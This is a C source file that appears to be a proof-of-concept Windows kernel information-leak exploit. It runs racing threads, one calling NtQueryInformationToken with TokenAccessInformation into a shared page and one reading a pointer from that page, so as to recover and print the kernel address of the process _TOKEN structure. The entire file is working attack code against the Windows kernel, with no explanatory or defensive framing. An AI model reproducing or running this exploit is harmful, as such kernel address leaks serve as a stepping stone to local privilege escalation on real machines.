#include <stdio.h>
#include <windows.h>
#include <winternl.h>
#include <processthreadsapi.h>
#include <Psapi.h>

#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "ntdll.lib")

HANDLE hToken;
BOOLEAN Done = FALSE;

NTSTATUS
NTAPI
NtQueryInformationToken(
    HANDLE TokenHandle,
    TOKEN_INFORMATION_CLASS TokenInformationClass,
    PVOID TokenInformation,
    ULONG TokenInformationLength,
    PULONG ReturnLength
);

ULONG GetNumberofProcessors()
{
    SYSTEM_INFO sysinfo;

    GetSystemInfo(&sysinfo);
    return (ULONG)sysinfo.dwNumberOfProcessors;
}

DWORD WINAPI RacingThread(LPVOID Parameter)
{
    while(!Done)
    {
        EmptyWorkingSet(GetCurrentProcess());
        ULONG_PTR SidAttributes = *(ULONG_PTR*)((char*)Parameter + 96);
        //printf("_SID_AND_ATTRIBUTES : 0x%llx\n", SidAttributes);
        
        if(SidAttributes > (ULONG_PTR)0x0000800000000000)
        { 
            //kernel mode.
            Done = TRUE;
            printf("[+] _TOKEN address: 0x%llx\n", SidAttributes - 0x490); // _TOKEN offset 
            //exit(0);
        }
    }
    return EXIT_SUCCESS;
}

DWORD WINAPI TokenThread(LPVOID Parameter)
{
    while(!Done)
    {
        EmptyWorkingSet(GetCurrentProcess());
        ULONG cbNeeded = 0;
        NtQueryInformationToken(hToken, TokenAccessInformation, Parameter, 0x1000, &cbNeeded);
    }

    return EXIT_SUCCESS;
}

int main()
{
    DWORD Mask = 0;
    DWORD Timeout = 60000;  //60s
    HANDLE TokenThreads[16] = {0};
    HANDLE RacingThreads[16] = {0};

    ULONG NoOfProcessor = GetNumberofProcessors();
    printf("[+] Number of processors: %d\n", NoOfProcessor);

    // set up the token handle and equired _TOKEN struct len(0x710 maybe).
    if(!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
    {
        printf("[.] OpenProcessToken failed : 0x%lu\n", GetLastError());
        goto cleanup;
    }

    // ULONG cbNeeded = 0;
    // NtQueryInformationToken(hToken, TokenAccessInformation, NULL, 0, &cbNeeded);
    // printf(" required lebgth: 0x%lu\n", cbNeeded);
    // reqlen = cbNeeded;
    // PVOID TokenInformation = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cbNeeded);

    // alloc the shared mem as page size.
    PVOID TokenInformation = VirtualAlloc(NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE | PAGE_NOCACHE);

    //start the race..
    printf("[+] Starting the TokenThread and RacingThread ...\n");
    for(int i = 0; i < NoOfProcessor; i++)
    {
        //printf("[+] starting Token Thread : %d\n", i);
        TokenThreads[i] = CreateThread(NULL, 0, TokenThread, (LPVOID)TokenInformation, CREATE_SUSPENDED, 0);
        SetThreadPriority(TokenThreads[i], THREAD_PRIORITY_HIGHEST);

        //printf("[+] starting RacingThread: %d\n", i);
        RacingThreads[i] = CreateThread(NULL, 0, RacingThread, (LPVOID)TokenInformation, CREATE_SUSPENDED, 0);
        SetThreadPriority(RacingThreads[i], THREAD_PRIORITY_HIGHEST);

        Mask |= 1 << i;
        SetThreadAffinityMask(TokenThreads[i], Mask);

        Mask |= 1 << (i+1);
        SetThreadAffinityMask(RacingThreads[i], Mask);

        ResumeThread(TokenThreads[i]);
        ResumeThread(RacingThreads[i]);
    
    }

    if(WaitForMultipleObjects(NoOfProcessor, RacingThreads, TRUE, Timeout))
    {
        for(int j = 0; j < NoOfProcessor; j++)
        {
            TerminateThread(TokenThreads[j], EXIT_SUCCESS);
            CloseHandle(TokenThreads[j]);

            TerminateThread(RacingThreads[j], EXIT_SUCCESS);
            CloseHandle(RacingThreads[j]);
        }
    }

    return 0;

    cleanup:
    printf("[.] fckedup \n");
    //if(TokenInformation) HeapFree(GetProcessHeap(), 0, TokenInformation);
    if(hToken) CloseHandle(hToken);
    exit(0);
}